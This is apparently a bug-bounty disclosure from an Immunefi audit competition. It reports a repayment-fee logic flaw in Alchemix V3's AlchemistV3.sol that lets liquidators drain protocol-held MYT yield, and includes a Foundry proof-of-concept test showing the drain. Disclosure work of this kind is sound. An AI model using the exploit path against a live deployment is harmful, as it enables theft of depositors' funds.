# 57617 sc critical protocol paid repayment fee transfer allows draining of protocol myt yield&#x20;

## #57617 \[SC-Critical] Protocol-paid repayment fee transfer allows draining of protocol MYT (yield)

**Submitted on Oct 27th 2025 at 16:19:29 UTC by @pindarev for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57617
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Protocol insolvency
  * Theft of unclaimed yield
  * Smart contract unable to operate due to lack of token funds

### Description

### Brief / Intro

A logic bug in `_resolveRepaymentFee` causes the contract to return the full computed repayment fee, while only deducting the clamped fee from the user’s collateral. The caller (\_liquidate) then transfers the returned (uncapped) fee from the protocol contract to the liquidator. If the user’s collateral is smaller than the computed fee, the protocol pays the difference out of its own balance (vault shares / MYT). Repeating this can drain protocol-held MYT shares (yield), cause insolvent accounting and break core operations.

### Vulnerability Details

## Root cause

A Mismatch between what the function returns and what it actually deducts from the user.

The relevant code:

```solidity
function _resolveRepaymentFee(uint256 accountId, uint256 repaidAmountInYield) internal returns (uint256 fee) {
    Account storage account = _accounts[accountId];
    // calculate repayment fee and deduct from account
    fee = repaidAmountInYield * repaymentFee / BPS;
    account.collateralBalance -= fee > account.collateralBalance ? account.collateralBalance : fee;
    emit RepaymentFee(accountId, repaidAmountInYield, msg.sender, fee);
    return fee;
}
```

How this is used in `_liquidate`:

```solidity
if (account.debt == 0) {
    // ...
    feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield);
    TokenUtils.safeTransfer(myt, msg.sender, feeInYield);
    return (repaidAmountInYield, feeInYield, 0);
}
```

Problem: `_resolveRepaymentFee` computes fee (the full theoretical fee), but only deducts min(fee, account.collateralBalance) from the account. It returns fee unchanged. The caller then transfers fee from the protocol (contract) to the caller, so when `fee > account.collateralBalance` the protocol pays `fee - accountCollateral` out of its own balance.

This is an economic logic bug: the protocol can be made to overpay the liquidator relative to what the user actually had.

This might be inteded but repeating this operation will lead to draining protocol-held MYT shares, causing the depositors in suffer in future actions, for example causing DoS later when another user try to withdraw his MYT.

Consider using the FeeVaults for covering such a fees.

### Impact Details

Direct theft of protocol-controlled yield: The protocol’s MYT/vault-share balance is transferred to an attacker (liquidator) beyond the user’s collateral. That is direct monetary loss for the protocol.

Protocol insolvency / inability to operate: Repeated drain reduces protocol reserves required to service redemptions or other payouts. If reserves run out, core functions (redeem, liquidate, repay) may revert or break.

Potential system-wide effects: Depleted reserves could force dependence on external funds, cause transmuter/backstop failures, or permit further cascading failures.

### References

Code snippets above from `AlchemistV3.sol`:

[\_resolveRepaymentFee](https://github.com/alchemix-finance/v3-poc/blob/immunefi_audit/src/AlchemistV3.sol?utm_source=immunefi#L900-L907)

[\_liquidate](https://github.com/alchemix-finance/v3-poc/blob/immunefi_audit/src/AlchemistV3.sol?utm_source=immunefi#L824)

### Proof of Concept

### Proof of Concept

Add the following test in `src/test/AlchemistV3.t.sol` file and run it using this command `forge test --mt test_PoC_RepaymentFee_ExceedsUserCollateral -vv`

PoC:

```solidity
    function test_PoC_RepaymentFee_ExceedsUserCollateral() external {
        // follow same setup used by other liquidate tests
        vm.startPrank(someWhale);
        IMockYieldToken(mockStrategyYieldToken).mint(whaleSupply, someWhale);
        vm.stopPrank();

        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount * 2);
        uint256 sharesBalance = IERC20(address(vault)).balanceOf(address(yetAnotherExternalUser));
        alchemist.deposit(depositAmount, yetAnotherExternalUser, 0);
        vm.stopPrank();

        // create a regular funded depositor like other tests use
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount + 100e18);
        alchemist.deposit(depositAmount, address(0xbeef), 0);
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));

        // mint maximum allowed debt against the collateral (same formula used in tests)
        uint256 mintAmount = (alchemist.totalValue(tokenId) * FIXED_POINT_SCALAR) / minimumCollateralization;
        alchemist.mint(tokenId, mintAmount, address(0xbeef));
        vm.stopPrank();

        // create a redemption so that debt becomes earmarked
        vm.startPrank(anotherExternalUser);
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), mintAmount);
        transmuterLogic.createRedemption(mintAmount);
        vm.stopPrank();

        uint256 transmuterPreviousBalance = IERC20(address(vault)).balanceOf(address(transmuterLogic));

        // skip to a future block. Lets say 100% of the way through the transmutation period (5_256_000 blocks)
        vm.roll(block.number + (5_256_000));

        // Earmarked debt should be 100% of the total debt
        (uint256 prevCollateral, uint256 prevDebt, uint256 earmarked) = alchemist.getCDP(tokenId);
        assert(earmarked == prevDebt);

        _manipulateYieldTokenPrice(1200);

        uint256 credit = earmarked > prevDebt ? prevDebt : earmarked;
        uint256 creditToYield = alchemist.convertDebtTokensToYield(credit);
        require(creditToYield > prevCollateral, "precondition failed: creditToYield <= collateral");

        // Minimal pre-liquidation snapshot
        uint256 alchemistSharesBefore = IERC20(address(vault)).balanceOf(address(alchemist));
        uint256 liquidatorBefore = IERC20(address(vault)).balanceOf(externalUser);

        // Perform liquidation
        vm.startPrank(externalUser);
        (uint256 assets, uint256 feeInYield, uint256 feeInUnderlying) = alchemist.liquidate(tokenId);
        (uint256 depositedCollateral, uint256 debt, ) = alchemist.getCDP(tokenId);
        vm.stopPrank();

        // Minimal post-liquidation snapshot
        uint256 alchemistSharesAfter = IERC20(address(vault)).balanceOf(address(alchemist));
        uint256 liquidatorAfter = IERC20(address(vault)).balanceOf(externalUser);

        uint256 userCollateralDeducted = prevCollateral > depositedCollateral
            ? prevCollateral - depositedCollateral
            : 0;
        uint256 alchemistSharesLoss = alchemistSharesBefore > alchemistSharesAfter
            ? alchemistSharesBefore - alchemistSharesAfter
            : 0;
        
        // Assert that protocol lose more shares than user's collateral deduction
        assert(alchemistSharesLoss > userCollateralDeducted);

        uint256 shortfall = alchemistSharesLoss > userCollateralDeducted ? alchemistSharesLoss - userCollateralDeducted : 0;
        // Assert that protocol loss exactly matches the the fee repayment
        assert(shortfall == feeInYield);

        console.log("POST: Collateral Repayment:            ", userCollateralDeducted);
        console.log("POST: Total Protocol Collateral Losed: ", alchemistSharesLoss);
        console.log("POST: Fees paid by protocol:           ", shortfall);
    }
```
